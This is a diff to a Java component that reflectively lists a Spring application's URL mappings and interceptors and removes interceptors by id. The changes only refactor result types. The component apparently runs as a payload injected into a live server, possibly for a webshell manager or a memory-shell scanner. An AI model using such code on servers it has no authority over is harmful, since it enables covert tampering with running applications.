@@ -7,8 +7,8 @@ import java.util.*;
 
 public class SpringFrameworkManageComponent implements Runnable {
 
-    private HashMap params;
-    private HashMap results;
+    private HashMap<String, Object> params;
+    private HashMap<String, Object> results;
 
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
@@ -90,13 +90,13 @@ public class SpringFrameworkManageComponent implements Runnable {
             Object key=s.next();
             Object mappingRegistration=registry.get(key);
             mapinfo.put("mappingInfo",key.toString());
-            mapinfo.put("mappingName",invokeMethod(mappingRegistration,"getMappingName"));
+            mapinfo.put("mappingName",String.valueOf(invokeMethod(mappingRegistration,"getMappingName")));
             try {
                 Set directPaths= (Set) invokeMethod(mappingRegistration,"getDirectPaths");
-                mapinfo.put("directPaths",directPaths.toArray());
+                mapinfo.put("directPaths",new ArrayList(directPaths));
             }catch (Exception e){
                 List directUrls= (List) invokeMethod(mappingRegistration,"getDirectUrls");
-                mapinfo.put("directPaths",directUrls.toArray());
+                mapinfo.put("directPaths",new ArrayList(directUrls));
             }
 
             Object handlerMethod=invokeMethod(mappingRegistration,"getHandlerMethod");
@@ -166,14 +166,14 @@ public class SpringFrameworkManageComponent implements Runnable {
                         excludePatternList.add(invokeMethod(excludePattern,"getPatternString"));
                     }
                 }
-                interceptorInfo.put("pathPatterns",pathPatterns);
+                interceptorInfo.put("pathPatterns",patternStrings(pathPatterns));
                 interceptorInfo.put("interceptorName",interceptor.getClass().getName());
-                interceptorInfo.put("excludePatterns",excludePatternList.toArray());
+                interceptorInfo.put("excludePatterns",excludePatternList);
                 interceptorInfo.put("interceptorId",interceptorId);
                 AllMappedInterceptor.add(interceptorInfo);
             }else {
                 String interceptorId= Integer.toHexString(System.identityHashCode(adaptedInterceptor));
-                interceptorInfo.put("pathPatterns",new String[]{"/*"});
+                interceptorInfo.put("pathPatterns",java.util.Collections.singletonList("/*"));
                 interceptorInfo.put("interceptorName",adaptedInterceptor.getClass().getName());
                 interceptorInfo.put("excludePatterns",null);
                 interceptorInfo.put("interceptorId",interceptorId);
@@ -199,6 +199,30 @@ public class SpringFrameworkManageComponent implements Runnable {
             }
         }
         return Boolean.valueOf(removed);
+    }
+
+    private ArrayList patternStrings(Object value) {
+        ArrayList answer = new ArrayList();
+        if (value == null) return answer;
+        if (value instanceof Iterable) {
+            Iterator iterator = ((Iterable) value).iterator();
+            while (iterator.hasNext()) answer.add(patternString(iterator.next()));
+        } else if (value instanceof Enumeration) {
+            Enumeration enumeration = (Enumeration) value;
+            while (enumeration.hasMoreElements()) answer.add(patternString(enumeration.nextElement()));
+        } else if (value.getClass().isArray()) {
+            int length = java.lang.reflect.Array.getLength(value);
+            for (int i = 0; i < length; i++) answer.add(patternString(java.lang.reflect.Array.get(value, i)));
+        } else {
+            answer.add(patternString(value));
+        }
+        return answer;
+    }
+
+    private String patternString(Object value) {
+        if (value == null) return "";
+        try { return String.valueOf(invokeMethod(value, "getPatternString")); }
+        catch (Throwable ignored) { return String.valueOf(value); }
     }
 
     private boolean removeInterceptorById(ArrayList interceptors, String interceptorId) {
